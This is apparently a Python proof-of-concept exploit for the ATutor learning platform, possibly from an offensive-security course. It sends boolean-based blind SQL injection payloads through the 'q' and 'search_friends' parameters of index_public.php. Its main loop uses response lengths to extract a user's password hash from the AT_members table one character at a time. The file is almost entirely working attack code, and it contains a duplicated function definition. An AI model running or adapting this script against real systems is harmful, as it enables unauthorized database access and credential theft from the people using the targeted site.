import sys
import re
import requests
from bs4 import BeautifulSoup

def searchFriends_sqli(ip, inj_str):
    target = "http://{}/ATutor/mods/_standard/social/index_public.php?q={}".format(ip, inj_str)
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')
    print("Length of response: {}".format(len(r.text)))
    print("Response Headers:")
    print(r.headers)
    print()
    print("Response Content:")
    print(s.text)
    print()
    error = re.search("Invalid argument", s.text)
    if error:
        print("Errors found in response. Possible SQL injection found")
    else:
        print("No errors found") 

def searchFriends_sqli(ip, inj_str):
    """
    This function will return True/False for Blind Injection
    :param ip: target ip
    :type ip: string
    :param inj_str: sql injection string
    :type inj_str: string
    :return: True/False
    :rtype: boolean
    """
    for j in range(32, 126):
        target = "http://{}/ATutor/mods/_standard/social/index_public.php?q={}".format(ip, inj_str.replace('[CHAR]', str(j)))
        r = requests.get(target)
        content_length = int(r.headers.get('Content-Length'))
        if content_length > 20:
            return j
    return False

def search_friends_sqli(ip, inj_str):
    """
    This targets the query string 'search_friends'
    :param ip: target ip
    :type ip: string
    :param inj_str: injection string
    :type inj_str: string
    :return: Extracted Character
    :rtype: Char
    """
    for j in range(32, 126):
        target = "http://{}/ATutor/mods/_standard/social/index_public.php?search_friends={}".format(ip, inj_str.replace('[CHAR]', str(j)))
        r = requests.get(target)
        s = BeautifulSoup(r.text, 'lxml')
        print(s.text)
        content_length = int(r.headers.get('Content-Length'))
        if content_length > 6100:
            return j
    return False


def main():
    if len(sys.argv) != 2:
        print("(+) usage: {} <target>".format(sys.argv[0]))
        sys.exit(-1)

    ip = sys.argv[1]
    for i in range(1,20):
        #inj_string = "test')/**/OR/**/(ASCII(SUBSTRING((SELECT/**/VERSION()),{},1)))=[CHAR]%23".format(i)
        inj_string = "test')/**/OR/**/(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/atutor.AT_members/**/WHERE/**/login='teacher',{},1)))=[CHAR]%23".format(i)
        #extracted_char = searchFriends_sqli(ip, inj_string)
        extracted_char = search_friends_sqli(ip, inj_string)
        sys.stdout.write(chr(extracted_char))
        sys.stdout.flush()
    print("\n(+) Done!")


if __name__ == "__main__":
    main()
